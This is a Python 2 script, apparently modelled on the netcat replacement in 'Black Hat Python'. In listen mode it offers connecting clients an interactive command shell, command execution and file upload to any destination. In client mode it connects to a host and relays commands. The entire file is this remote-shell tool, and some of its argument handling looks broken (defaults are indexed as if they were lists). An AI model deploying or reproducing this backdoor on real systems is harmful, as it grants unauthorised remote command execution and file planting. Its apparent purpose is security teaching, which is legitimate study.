# Inspired by Black Hat Python, the book by Justin Seitz

import sys, socket, argparse, threading, subprocess

def read_and_send():
    while True:
        try:
            bffr = read_from_stdin()
        except KeyboardInterrupt:
            sys.exit(1)
        try:
            send_to_client(bffr)
        except KeyboardInterrupt:
            continue
        except:
            sys.exit(0)

def read_from_stdin():
    try:
        print
        print '___________________________ REQUEST ____________________________'
        bffr = raw_input()
        print '________________________________________________________________'
        print
        return bffr
    except KeyboardInterrupt:
        print '[*] Aborted'
        raise

def send_to_client(bffr):
    try:

        # send data if there is any
        if len(bffr):
            client.send(bffr)

        # wait for data back
        while True:

            response = client.recv(4096)
            if response and len(response) < 4096:
                break

        print
        print '*************************** RESPONSE ***************************'
        print response
        print '****************************************************************'
        print
        print
        return 'wat'

    except KeyboardInterrupt:
        print '[*] Transfer Aborted'
        raise

    except Exception as exc:
        print '[*] Exiting:', exc
        raise

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((args.target[0], args.port[0]))
    server.listen(5)

    while True:
        client_socket, client_addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,
            args=(client_socket,))
        client_thread.start()

def client_handler(client_socket):
    # check for upload
    if args.upload:

        # read in all the bytes and write to destination
        file_buffer = ''
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # write out the bytes
        try:
            file_descriptor = open(args.destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()
        except:
            client_socket.send('Failed to upload file to %s\r\n'
                % args.destination)

    # check for command execution
    if args.execute:

        # run the command
        output = run_command(args.execute)

        client_socket.send(output)

    # check for command shell request
    if args.command:

        while True:
            # show prompt
            client_socket.send('<server>$ ')
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back response to client
            response = run_command(cmd_buffer)
            client_socket.send(response)

def run_command(command):
    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT,
            shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # return the command output
    return output

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', nargs=1, default='0.0.0.0',
        metavar='HOST')
    parser.add_argument('-p', '--port', nargs=1, default=1337, type=int,
        metavar='PORT')
    parser.add_argument('-l', '--listen', action='store_true',
        help='listen on [host]:[port] for incoming connections')
    parser.add_argument('-e', '--execute', nargs=1, metavar='FILE',
        help='execute the given file upon receiving a connection')
    parser.add_argument('-c', '--command', action='store_true',
        help='initialize a command shell')
    parser.add_argument('-u', '--upload', nargs=1, metavar='DESTINATION',
        help='upon receiving a connection, upload a file and write \
              to DESTINATION')
    args = parser.parse_args()

    print args

    # if running in server mode
    if args.listen:
        start_server()

    # if running in client mode
    else:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print args.target
        print type(args.target)
        print args.port
        print type(args.port)
        client.connect((args.target[0], args.port[0]))
        read_and_send()
        client.close()
